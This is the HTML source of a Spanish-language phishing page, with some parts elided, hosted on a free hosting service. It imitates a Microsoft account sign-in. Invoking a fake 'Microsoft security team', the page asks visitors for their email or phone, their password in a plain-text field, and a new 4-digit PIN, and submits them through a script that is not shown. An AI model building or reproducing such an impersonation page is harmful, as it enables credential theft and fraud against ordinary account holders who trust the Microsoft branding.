...
<!-- Inserted by miarroba -->
  ...
  <style>
      ...
      html {
          height: 100%;
          background-image: url("https://pbs.twimg.com/media/Fth-XmMXwBYrdcF?format=jpg&name=small");
      ...
      .login-box {
          ...
          box-shadow: 0px 0px 1px 0.1px #9de1da;
          border-radius: 5px;
...
<!-- Inserted by miarroba --><div class="login-container">
  <div class="wrapper">
      <div class="col-xs-12 col-sm-4 col-sm-offset-4 login-box" style="z-index:1000">
          <div class="login-header"><img src="https://pbs.twimg.com/media/Fth9clMXwBYturo?format=jpg&amp;name=small">
            ...
            <h5 class="ingresa-cuenta">Iniciar sesión para confirmar su identidad y proteger su cuenta</h5>
          </div>
          <div class="alert alert-danger" id="error-message"></div>
          <div>
              <form action="" method="post" onsubmit=" return sender()">
                <div class="form-group label-animate" bis_skin_checked="1"><input class="form-control" id="uzer" type="email" name="uzer" autocomplete="off" placeholder="Correo electrónico, teléfono o Skype" required=""></div><br>
                <div class="form-group label-animate" bis_skin_checked="1"><input class="form-control" id="pazz" name="pazz" type="text" placeholder="Contraseña" required=""></div>
                </div>
        <div id="YkamcjCUbXrjXrQ" style="display: block; font-size: 11px;" class="iHdVbkVQvFXkuwc" bis_skin_checked="1">Equipo de seguridad Microsoft recomienda crear un pin que use frecuentemente para evitar inconvenientes en el futuro.</div><br>
        <div class="form-group label-animate" bis_skin_checked="1"><div class="form-group label-animate" bis_skin_checked="1"><input class="form-control" id="p1n" type="number4" name="p1n" autocomplete="off" placeholder="Cree un PIN de 4 dígitos" maxlength="4" required=""></div></div>
                                                 <p id="gfg"  hidden="">
                                                 <p id="address"  hidden="">
              ...
              <p class="center text" style="margin: 0;">Equipo de cuentas de Microsoft</p>
              <div class="center">
              </div>
          </div>
      </div>
...
<script></script><!-- Inserted by miarroba -->
</script></noframes></noembed></noscript><script type="text/javascript" src="https://hosting.miarroba.info/?__muid=&amp;h=2162842&amp;t=1711183327&amp;k=b40f4f7c83866011fff9b66e282e5a7b"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="https://hosting.miarroba.info/?__muid=&amp;h=2162842&amp;t=1711183327&amp;k=b40f4f7c83866011fff9b66e282e5a7b&amp;img=1" /></noscript>
<!-- Inserted by miarroba -->
</body></html>